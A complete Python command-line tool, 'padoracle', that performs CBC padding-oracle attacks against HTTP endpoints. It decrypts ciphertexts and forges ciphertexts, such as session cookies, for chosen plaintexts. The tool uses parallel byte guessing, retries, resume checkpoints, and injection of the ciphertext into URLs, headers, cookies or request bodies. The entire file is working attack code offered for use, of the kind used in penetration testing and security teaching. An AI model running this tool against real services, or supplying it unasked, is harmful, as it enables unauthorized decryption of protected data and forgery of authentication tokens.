#!/usr/bin/env python3
"""padoracle: a concurrent CBC padding-oracle decrypt/encrypt tool.

A standalone alternative to padbuster. Standard library only, no installs.
Decrypt a ciphertext or forge one for a chosen plaintext against any HTTP
padding oracle, with parallel byte search and automatic retry.
"""

from __future__ import annotations

import argparse
import base64
import concurrent.futures as cf
import os
import sys
import time
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional, Tuple
from urllib.parse import quote

__version__ = "1.0.0"

Oracle = Callable[[bytes], bool]


class PaddingOracleError(Exception):
    pass


class OracleUnreachable(PaddingOracleError):
    pass


# --- byte helpers ----------------------------------------------------------

def xor(a: bytes, b: bytes) -> bytes:
    return bytes(x ^ y for x, y in zip(a, b))


def blocks_of(data: bytes, size: int) -> List[bytes]:
    return [data[i:i + size] for i in range(0, len(data), size)]


def pkcs7_pad(data: bytes, size: int) -> bytes:
    pad = size - (len(data) % size)
    return data + bytes([pad]) * pad


def pkcs7_unpad(data: bytes, size: int, strict: bool = True) -> bytes:
    if not data or len(data) % size:
        if strict:
            raise ValueError("input is not block aligned")
        return data
    pad = data[-1]
    if 1 <= pad <= size and data[-pad:] == bytes([pad]) * pad:
        return data[:-pad]
    if strict:
        raise ValueError("invalid PKCS7 padding")
    return data


# --- codecs ----------------------------------------------------------------

CODECS: Dict[str, Tuple[Callable[[bytes], str], Callable[[str], bytes]]] = {
    "hex": (lambda b: b.hex(), bytes.fromhex),
    "base64": (lambda b: base64.b64encode(b).decode(), base64.b64decode),
    "base64url": (lambda b: base64.urlsafe_b64encode(b).decode(), base64.urlsafe_b64decode),
}


# --- attack engine (transport agnostic) ------------------------------------

Progress = Callable[[int, int, bytes], None]  # (block_index, byte_pos, intermediate)


@dataclass
class PaddingOracleAttack:
    """Pure CBC padding-oracle attack driven by any boolean oracle.

    The oracle returns True when a submitted ciphertext has valid padding.
    """

    oracle: Oracle
    block_size: int = 16
    workers: int = 16

    def intermediate(self, target: bytes, progress: Optional[Callable[[int, bytes], None]] = None) -> bytes:
        """Recover the block cipher output D(target), one byte at a time."""
        bs = self.block_size
        inter = bytearray(bs)
        for pad in range(1, bs + 1):
            pos = bs - pad
            base = bytearray(bs)
            for k in range(pos + 1, bs):
                base[k] = inter[k] ^ pad
            hits = self._guess_byte(base, pos, target, stop_at_first=pad > 1)
            if len(hits) > 1:
                hits = self._disambiguate(base, pos, target, hits)
            if not hits:
                raise PaddingOracleError(
                    f"no valid byte at position {pos}; the padding-success test is likely wrong"
                )
            inter[pos] = hits[0] ^ pad
            if progress:
                progress(pos, bytes(inter))
        return bytes(inter)

    def decrypt(
        self,
        ciphertext: bytes,
        iv: Optional[bytes] = None,
        known: Optional[Dict[int, bytes]] = None,
        on_block: Optional[Callable[[int, bytes], None]] = None,
        progress: Optional[Progress] = None,
    ) -> bytes:
        chain = ([iv] if iv is not None else []) + blocks_of(ciphertext, self.block_size)
        if len(chain) < 2:
            raise ValueError("need at least two blocks (IV + one), or pass an explicit IV")
        known = known or {}
        out = bytearray()
        for i in range(1, len(chain)):
            if i in known:
                inter = known[i]
            else:
                step = (lambda pos, state, b=i: progress(b, pos, state)) if progress else None
                inter = self.intermediate(chain[i], step)
                if on_block:
                    on_block(i, inter)
            out += xor(inter, chain[i - 1])
        return bytes(out)

    def encrypt(self, plaintext: bytes, progress: Optional[Progress] = None) -> bytes:
        """Forge a ciphertext (IV + blocks) that decrypts to plaintext."""
        chain = [os.urandom(self.block_size)]
        padded = blocks_of(pkcs7_pad(plaintext, self.block_size), self.block_size)
        for i, pt in enumerate(reversed(padded)):
            step = (lambda pos, state, b=i: progress(b, pos, state)) if progress else None
            inter = self.intermediate(chain[0], step)
            chain.insert(0, xor(inter, pt))
        return b"".join(chain)

    def _guess_byte(self, base: bytearray, pos: int, target: bytes, stop_at_first: bool) -> List[int]:
        hits: List[int] = []

        def test(value: int) -> Optional[int]:
            forged = bytearray(base)
            forged[pos] = value
            return value if self.oracle(bytes(forged) + target) else None

        with cf.ThreadPoolExecutor(max_workers=self.workers) as pool:
            futures = {pool.submit(test, v): v for v in range(256)}
            for future in cf.as_completed(futures):
                result = future.result()
                if result is None:
                    continue
                hits.append(result)
                if stop_at_first:
                    for pending in futures:
                        pending.cancel()
                    break
        return hits

    def _disambiguate(self, base: bytearray, pos: int, target: bytes, hits: List[int]) -> List[int]:
        """Resolve the final-byte ambiguity by disturbing the neighbouring byte."""
        survivors = []
        for value in hits:
            forged = bytearray(base)
            forged[pos] = value
            if pos > 0:
                forged[pos - 1] ^= 0xFF
            if self.oracle(bytes(forged) + target):
                survivors.append(value)
        return survivors or hits


# --- HTTP oracle -----------------------------------------------------------

@dataclass
class ResponseTest:
    """Decides whether a response means valid padding."""

    error: Optional[bytes] = None
    valid: Optional[bytes] = None
    invalid_status: Optional[int] = None

    def is_valid(self, status: int, body: bytes) -> bool:
        if self.error is not None:
            return self.error not in body
        if self.valid is not None:
            return self.valid in body
        if self.invalid_status is not None:
            return status != self.invalid_status
        raise ValueError("ResponseTest needs error, valid, or invalid_status")


@dataclass
class HTTPOracle:
    url: str
    test: ResponseTest
    encode: Callable[[bytes], str]
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[str] = None
    marker: str = "^CT^"
    urlencode: bool = False
    timeout: float = 15.0
    retries: int = 5
    backoff: float = 3.0

    def targets(self) -> List[str]:
        spots = [self.url, self.data or ""] + list(self.headers.values())
        return [s for s in spots if self.marker in s]

    def request(self, ciphertext: bytes) -> Tuple[int, bytes]:
        token = self.encode(ciphertext)
        if self.urlencode:
            token = quote(token, safe="")
        url = self.url.replace(self.marker, token)
        headers = {k: v.replace(self.marker, token) for k, v in self.headers.items()}
        body = self.data.replace(self.marker, token).encode() if self.data else None
        req = urllib.request.Request(url, data=body, headers=headers, method=self.method)
        last: Optional[Exception] = None
        for attempt in range(self.retries + 1):
            try:
                try:
                    resp = urllib.request.urlopen(req, timeout=self.timeout)
                    return resp.getcode(), resp.read()
                except urllib.error.HTTPError as http_err:
                    return http_err.code, http_err.read()
            except Exception as err:  # noqa: BLE001 - connection resets, timeouts, DNS
                last = err
                if attempt < self.retries:
                    time.sleep(self.backoff)
        raise OracleUnreachable(f"{self.url} unreachable after {self.retries} retries: {last}")

    def __call__(self, ciphertext: bytes) -> bool:
        status, body = self.request(ciphertext)
        return self.test.is_valid(status, body)


# --- command line ----------------------------------------------------------

def build_oracle(args: argparse.Namespace, encode: Callable[[bytes], str]) -> HTTPOracle:
    headers = dict(h.split(":", 1) for h in args.header)
    headers = {k.strip(): v.strip() for k, v in headers.items()}
    if args.cookie:
        headers["Cookie"] = args.cookie

    if args.error is not None:
        test = ResponseTest(error=args.error.encode())
    elif args.valid is not None:
        test = ResponseTest(valid=args.valid.encode())
    else:
        test = ResponseTest(invalid_status=args.invalid_status)

    oracle = HTTPOracle(
        url=args.url,
        test=test,
        encode=encode,
        method=args.method,
        headers=headers,
        data=args.data,
        marker=args.marker,
        urlencode=args.urlencode,
        timeout=args.timeout,
        retries=args.retries,
        backoff=args.backoff,
    )
    if not oracle.targets():
        raise SystemExit(
            f"marker {args.marker!r} not found in url, cookie, headers, or data; "
            f"put it where the ciphertext belongs, e.g. --cookie 'session={args.marker}'"
        )
    return oracle


def make_progress(quiet: bool, block_size: int) -> Optional[Progress]:
    if quiet:
        return None

    def show(block: int, pos: int, state: bytes) -> None:
        done = block_size - pos
        sys.stderr.write(f"\r[block {block}] {done:2d}/{block_size} bytes  {state.hex()}")
        sys.stderr.flush()
        if pos == 0:
            sys.stderr.write("\n")

    return show


def preflight(oracle: HTTPOracle, ciphertext: bytes, quiet: bool) -> None:
    status, body = oracle.request(ciphertext)
    valid = oracle.test.is_valid(status, body)
    if not quiet:
        sys.stderr.write(
            f"[*] preflight: HTTP {status}, {len(body)} bytes, "
            f"baseline padding reads {'VALID' if valid else 'INVALID'}\n"
        )
    if not valid:
        sys.stderr.write(
            "[!] the real ciphertext reads as INVALID padding; the success test is "
            "probably wrong and every byte will look valid\n"
        )


def run_decrypt(args: argparse.Namespace) -> int:
    encode, decode = CODECS[args.encoding]
    oracle = build_oracle(args, encode)
    ciphertext = decode(args.ciphertext)
    iv = bytes.fromhex(args.iv) if args.iv else None

    if not args.no_preflight:
        preflight(oracle, ciphertext, args.quiet)

    attack = PaddingOracleAttack(oracle, block_size=args.block_size, workers=args.workers)
    known, state = load_state(args.state, args.ciphertext)
    on_block = (lambda i, inter: save_state(args.state, args.ciphertext, state, i, inter)) if args.state else None

    started = time.time()
    plaintext = attack.decrypt(
        ciphertext, iv=iv, known=known, on_block=on_block,
        progress=make_progress(args.quiet, args.block_size),
    )
    if not args.quiet:
        sys.stderr.write(f"[*] done in {time.time() - started:.1f}s\n")

    recovered = plaintext if args.raw else pkcs7_unpad(plaintext, args.block_size, strict=False)
    emit(recovered)
    return 0


def run_encrypt(args: argparse.Namespace) -> int:
    encode, _ = CODECS[args.encoding]
    oracle = build_oracle(args, encode)
    plaintext = bytes.fromhex(args.plaintext) if args.hex else args.plaintext.encode()

    attack = PaddingOracleAttack(oracle, block_size=args.block_size, workers=args.workers)
    forged = attack.encrypt(plaintext, progress=make_progress(args.quiet, args.block_size))

    if not args.quiet:
        sys.stderr.write("[*] forged ciphertext (decrypts to your plaintext):\n")
    print(encode(forged))
    return 0


def load_state(path: Optional[str], sample: str) -> Tuple[Dict[int, bytes], dict]:
    if not path or not os.path.exists(path):
        return {}, {}
    import json
    with open(path) as fh:
        store = json.load(fh)
    block_map = store.get(sample, {})
    return {int(k): bytes.fromhex(v) for k, v in block_map.items()}, store


def save_state(path: str, sample: str, store: dict, block: int, inter: bytes) -> None:
    import json
    store.setdefault(sample, {})[str(block)] = inter.hex()
    with open(path, "w") as fh:
        json.dump(store, fh)


def emit(data: bytes) -> None:
    print(f"hex:   {data.hex()}")
    try:
        print(f"ascii: {data.decode()}")
    except UnicodeDecodeError:
        print(f"bytes: {data!r}")


def parse_args(argv: Optional[List[str]] = None) -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        prog="padoracle",
        description="concurrent CBC padding-oracle decrypt and encrypt",
    )
    parser.add_argument("--version", action="version", version=f"%(prog)s {__version__}")
    sub = parser.add_subparsers(dest="mode", required=True)

    def add_common(sp: argparse.ArgumentParser) -> None:
        sp.add_argument("--url", required=True, help="target URL; may contain the marker")
        sp.add_argument("--cookie", help="Cookie header value; may contain the marker")
        sp.add_argument("--header", action="append", default=[], help="'Name: value', repeatable")
        sp.add_argument("--data", help="request body; implies POST if --method not set")
        sp.add_argument("--method", default="GET")
        sp.add_argument("--marker", default="^CT^", help="placeholder replaced by the ciphertext")
        sp.add_argument("--encoding", choices=list(CODECS), default="hex")
        sp.add_argument("--urlencode", action="store_true", help="URL-encode the injected value")
        sp.add_argument("--block-size", type=int, default=16)
        sp.add_argument("--workers", type=int, default=16, help="parallel guesses per byte")
        sp.add_argument("--timeout", type=float, default=15.0)
        sp.add_argument("--retries", type=int, default=5)
        sp.add_argument("--backoff", type=float, default=3.0)
        sp.add_argument("--quiet", action="store_true")
        group = sp.add_mutually_exclusive_group(required=True)
        group.add_argument("--error", help="response substring that marks INVALID padding")
        group.add_argument("--valid", help="response substring that marks VALID padding")
        group.add_argument("--invalid-status", type=int, help="HTTP status that marks INVALID padding")

    dec = sub.add_parser("decrypt", help="recover plaintext from a ciphertext")
    add_common(dec)
    dec.add_argument("ciphertext", help="encoded ciphertext to decrypt")
    dec.add_argument("--iv", help="explicit IV (hex); default treats the first block as IV")
    dec.add_argument("--raw", action="store_true", help="do not strip PKCS7 padding")
    dec.add_argument("--state", help="checkpoint file for resume")
    dec.add_argument("--no-preflight", action="store_true")

    enc = sub.add_parser("encrypt", help="forge a ciphertext for a chosen plaintext")
    add_common(enc)
    enc.add_argument("plaintext", help="plaintext to encrypt")
    enc.add_argument("--hex", action="store_true", help="treat plaintext as hex bytes")

    args = parser.parse_args(argv)
    if args.data and args.method == "GET":
        args.method = "POST"
    return args


def main(argv: Optional[List[str]] = None) -> int:
    args = parse_args(argv)
    try:
        return run_decrypt(args) if args.mode == "decrypt" else run_encrypt(args)
    except OracleUnreachable as err:
        sys.stderr.write(f"[!] {err}\n    run this where the route to the target lives\n")
        return 2
    except PaddingOracleError as err:
        sys.stderr.write(f"[!] {err}\n")
        return 3
    except KeyboardInterrupt:
        sys.stderr.write("\n[!] interrupted; rerun with --state to resume\n")
        return 130


if __name__ == "__main__":
    sys.exit(main())
